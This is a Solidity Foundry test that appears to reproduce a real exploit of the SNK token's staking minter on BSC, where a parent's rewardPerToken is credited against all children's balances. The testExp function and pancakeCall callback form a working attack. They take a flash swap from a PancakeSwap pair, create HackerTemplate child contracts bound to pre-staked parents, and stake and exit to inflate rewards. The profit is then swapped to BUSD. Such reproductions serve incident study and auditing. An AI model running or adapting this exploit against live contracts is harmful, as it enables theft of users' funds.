// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1656176776425644032
// @TX
// https://explorer.phalcon.xyz/tx/bsc/0xace112925935335d0d7460a2470a612494f910467e263c7ff477221deee90a2c
// https://explorer.phalcon.xyz/tx/bsc/0x7394f2520ff4e913321dd78f67dd84483e396eb7a25cbb02e06fe875fc47013a
// @Summary
// parent `rewardPerToken`, but times all children's balance

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);
    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
    function getAmountsIn(
        uint256 amountOut,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}

interface ISNKMinter {
    function bindParent(address parent) external;
    function stake(uint256 amount) external;
    function getReward() external;
    function exit() external;
}

contract SNKExp is Test, IPancakeCallee {
    IERC20 SNKToken = IERC20(0x05e2899179003d7c328de3C224e9dF2827406509);
    ISNKMinter minter = ISNKMinter(0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee);
    IPancakePair pool = IPancakePair(0x7957096Bd7324357172B765C4b0996Bb164ebfd4);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address[] public parents;

    function setUp() public {
        cheats.createSelectFork("bsc", 27_784_455);
        deal(address(SNKToken), address(this), 1000 ether);
        for (uint256 i = 0; i < 10; ++i) {
            HackerTemplate t1 = new HackerTemplate();
            SNKToken.transfer(address(t1), 100 ether);
            t1.stake();
            parents.push(address(t1));
        }
        uint256 startTime = block.timestamp;
        vm.warp(startTime + 20 days);
        SNKToken.approve(address(router), type(uint256).max);
        SNKToken.approve(address(pool), type(uint256).max);
    }

    function testNormal() external {
        for (uint256 i = 0; i < 10; ++i) {
            HackerTemplate t = HackerTemplate(parents[i]);
            t.exit2();
        }
        address[] memory path = new address[](2);
        path[0] = address(SNKToken);
        path[1] = (address(BUSD));
        emit log_named_decimal_uint("Normal SNK Amount should get", SNKToken.balanceOf(address(this)), 18);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SNKToken.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
        emit log_named_decimal_uint("Normal BUSD Amount should get", BUSD.balanceOf(address(this)), 18);
    }

    function testExp() external {
        pool.swap(80_000 ether, 0, address(this), bytes("0x123"));

        address[] memory path = new address[](2);
        path[0] = address(SNKToken);
        path[1] = (address(BUSD));
        emit log_named_decimal_uint("EXP SNK Amount get", SNKToken.balanceOf(address(this)), 18);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SNKToken.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
        emit log_named_decimal_uint("EXP BUSD Amount get", BUSD.balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        for (uint256 i = 0; i < 10; ++i) {
            HackerTemplate t1 = new HackerTemplate();
            HackerTemplate t = HackerTemplate(parents[i]);
            t1.bind(parents[i]);
            SNKToken.transfer(address(t1), SNKToken.balanceOf(address(this)));
            t1.stake();
            t.exit2();
            t1.exit1();
        }
        SNKToken.transfer(address(pool), 85_000 ether);
    }
}

contract HackerTemplate {
    IERC20 SNKToken = IERC20(0x05e2899179003d7c328de3C224e9dF2827406509);
    ISNKMinter minter = ISNKMinter(0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee);
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "onlyOwner");
        _;
    }

    function stake() public onlyOwner {
        SNKToken.approve(address(minter), SNKToken.balanceOf(address(this)));
        minter.stake(SNKToken.balanceOf(address(this)));
    }

    function bind(address p) public onlyOwner {
        minter.bindParent(p);
    }

    function exit1() public onlyOwner {
        minter.exit();
        SNKToken.transfer(owner, SNKToken.balanceOf(address(this)));
    }

    function exit2() public onlyOwner {
        minter.getReward();
        minter.exit();
        SNKToken.transfer(owner, SNKToken.balanceOf(address(this)));
    }
}
